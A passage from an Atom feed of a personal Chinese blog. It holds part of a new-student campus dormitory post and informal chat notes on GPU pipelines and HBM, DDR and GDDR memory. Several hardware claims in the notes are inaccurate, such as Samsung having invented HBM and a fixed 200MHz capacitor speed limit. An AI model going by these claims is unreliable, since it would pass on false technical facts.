    <summary type="html">&lt;pre&gt;&lt;code&gt;写在前面，本内容纯属个人性质的感受和体验，仅代表我个人的观点和立场。作为20届新生开学一个月来的初步体验，为下一届航空港的新生提供有限的参考
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先说学校的住宿，对于航空港的情况来说，没有4人间，只有6人间存在，航空港校区仅有的</summary>
      
    
    
    
    <category term="我不为人知的日常" scheme="https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>2020-9-2 大佬茶谈</title>
    <link href="https://zwh-china.github.io/2020/09/02/2020-9-2-%E5%A4%A7%E4%BD%AC%E8%8C%B6%E8%B0%88/"/>
    <id>https://zwh-china.github.io/2020/09/02/2020-9-2-%E5%A4%A7%E4%BD%AC%E8%8C%B6%E8%B0%88/</id>
    <published>2020-09-02T12:09:04.000Z</published>
    <updated>2021-04-20T21:15:38.441Z</updated>
    
    <content type="html"><![CDATA[<p>1.GPU的特性在于它可以快速从GRAM读出大量数据并丢进流水线，以及在进行纹理采样等操作的时候可以在最不占用IO的情况下把纹理数据丢给每个流水线</p><p>2.gpu有多核多线程多simd组，shader其实就是写一个simd对象的过程，gpu并发就是这么起来的，核心上的每个线程指令都是simd的好多个具体目标，这里说的“核”的数量，其实是流水线的数量，而非类似cpu的核心</p><p>3.FAQ:你知道HBM，DDR，GDDR内存的区别吗？</p><ul><li><p>  HBM是三星发明的High Bandwidth Memory 特性是频率低，数据线多，有上千条，读一次就能读出几百几千个字节，缺点是布线和生产工艺极其复杂，设计难度极高，良品率低，优点是体积小发热低，能把性能相当于RTX2080Ti的显卡缩小到很小</p></li><li><p>  硬件方面，实现颇为复杂，但主要还是和显存的设计息息相关，上述HBM和GDDR走的是完全不一样的路线</p></li><li><p>  DDR内存，使用一条时钟信号线，它的两个边沿都有作用，可以处理一条读取或者写入的请求，而GDDR有两条时钟线，每条时钟线每个边沿都有作用，所以速度上又比DDR快两倍，DDR则比普通的DRAM快两倍，所以GDDR应该改名叫QDR，因为是四倍速动态内存，然而不管是SDRAM还是DDR还是GDDR还是HBM，作为其存储元件的电容器结构，它的物理速度极限其实就是200MHz封顶，所以本质上GDDR就是一种速度更快的内存</p></li></ul><p>3.然后GPU不仅使用这样的内存，而且GPU读取内存的过程是连续读取写入，相当于同时打开N个Row然后一次性连续读写完并立即关闭，CPU操作内存的过程就不太一样了，一方面CPU并不一定都是按页操作内存的，因为有多线程信号的关系有时候需要越过缓存直接读写内存的某个字节（需要先打开Row再操作再关闭，另一方面CPU需要和外设争夺内存的使用权，需要使用锁，或者原子操作</p><p>4.GPU图形性能高，是因为IO效率高，可以迅速把大量数据装入流水线，同样的，一个流水线足够深的CPU，在使用足够快的独占动态内存的时候，配合专门设计的缓存模式和内存批量读写方式，是可以达到GPU性能的，更何况N卡的GPU默认使用低精度浮点数计算模型</p><p><img src="http://106.15.74.181/wp-content/uploads/2020/09/NHO5G3IB7BDCFA6VV6-1024x576.png"></p><p><img src="http://106.15.74.181/wp-content/uploads/2020/09/020P6GVL_JBEHJSHR-1-473x1024.jpg"></p><p>5.gpu上面很大一部分就是这种compute单元，l1，l2的cache都出来了，然后单元上面还有寄存器，然后GPU的GDDR特别擅长迅速给这些单元填入数据</p><p>By 0xAA55 and 紫国传教士</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.GPU的特性在于它可以快速从GRAM读出大量数据并丢进流水线，以及在进行纹理采样等操作的时候可以在最不占用IO的情况下把纹理数据丢给每个流水线&lt;/p&gt;
&lt;p&gt;2.gpu有多核多线程多simd组，shader其实就是写一个simd对象的过程，gpu并发就是这么起来的，核心</summary>
      
    
    
    
    <category term="计算机知识" scheme="https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
</feed>
